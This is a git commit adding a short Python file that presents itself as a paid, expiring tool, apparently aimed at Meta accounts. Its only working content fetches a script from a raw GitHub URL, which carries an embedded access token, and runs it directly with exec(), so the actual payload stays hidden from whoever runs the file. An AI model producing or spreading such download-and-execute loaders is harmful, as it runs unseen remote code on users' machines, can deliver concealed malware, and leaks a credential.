6631e4225b78c80aebdc8222d5204e8e05804afe
Badmosh Bachaa <157085425+harsh2006-bot@users.noreply.github.com>
2025-03-07 00:23:00 +0530

    Add files via upload

---
+++ META ALL YEAR TIME ENC BY @F88UF.py
@@ -0,0 +1,7 @@
+# Harsh Meta+All Year 
+# Expire On 17 March :)
+import requests
+code = 'HARSH'
+res=requests.get('https://raw.githubusercontent.com/harsh2006-bot/Harsh-Paid-File-/refs/heads/main/META%20ALL%20YEAR%20LIMIT%20FILE%20BY%20%40F88UF.py?token=GHSAT0AAAAAAC774IUHM2RZA4VILEBY7QAAZ6J5K3A')
+exec(res.text)
+# DEV - @F88UF | CHANNEL - @F88UF9844
